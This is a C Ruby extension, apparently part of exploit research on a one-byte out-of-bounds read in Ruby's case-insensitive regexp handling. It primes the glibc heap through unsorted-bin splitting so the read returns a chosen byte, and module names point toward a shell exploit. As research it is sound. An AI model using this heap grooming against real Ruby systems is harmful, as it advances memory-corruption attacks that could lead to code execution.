/* Analysis-only probe for the case-fold one-byte-exact OOB read.
 *
 * New shape versus ruby2shell-casefold-stringprime: free a large chunk into
 * the unsorted bin after filling every byte with a chosen fold's second byte,
 * then split it with a front allocation.  The remaining unsorted chunk still
 * carries the prime in its user area; glibc's unsorted split leaves bytes
 * 0..15 of the chunk handed to the next small allocation untouched (only the
 * remainder's prev_size/size at +0x10/+0x18 are rewritten).  Regexp.new with
 * a one-byte IGNORECASE exact then allocates its 1-byte reg->exact from that
 * remainder, so exact+1 may carry the chosen byte rather than tcache/fastbin
 * metadata.
 *
 * No wire path, no app, no marker, no debugger writes in the request path.
 */
#include "ruby.h"
#include <stdlib.h>
#include <string.h>

char *splitprime_g_big;
char *splitprime_g_front;
size_t splitprime_g_biglen;
size_t splitprime_g_frontlen;

static VALUE
splitprime_prepare(VALUE self, VALUE byte_value, VALUE biglen_value, VALUE frontlen_value)
{
    unsigned int byte = NUM2UINT(byte_value);
    size_t biglen = (size_t)NUM2ULONG(biglen_value);
    size_t frontlen = (size_t)NUM2ULONG(frontlen_value);

    if (biglen < 0x100 || frontlen < 0x20 || frontlen + 0x40 > biglen)
        rb_raise(rb_eArgError, "bad lengths");
    splitprime_g_biglen = biglen;
    splitprime_g_frontlen = frontlen;
    splitprime_g_big = malloc(biglen);
    if (!splitprime_g_big) rb_raise(rb_eNoMemError, "malloc");
    memset(splitprime_g_big, (int)byte, biglen);
    free(splitprime_g_big);                       /* unsorted bin */
    splitprime_g_front = malloc(frontlen);        /* split; remainder stays */
    if (!splitprime_g_front) rb_raise(rb_eNoMemError, "malloc");
    return Qnil;
}

void
Init_ruby2shell_casefold_splitprime(void)
{
    VALUE mod = rb_define_module("Ruby2ShellCasefoldSplitprime");
    rb_define_singleton_method(mod, "prepare", splitprime_prepare, 3);
}
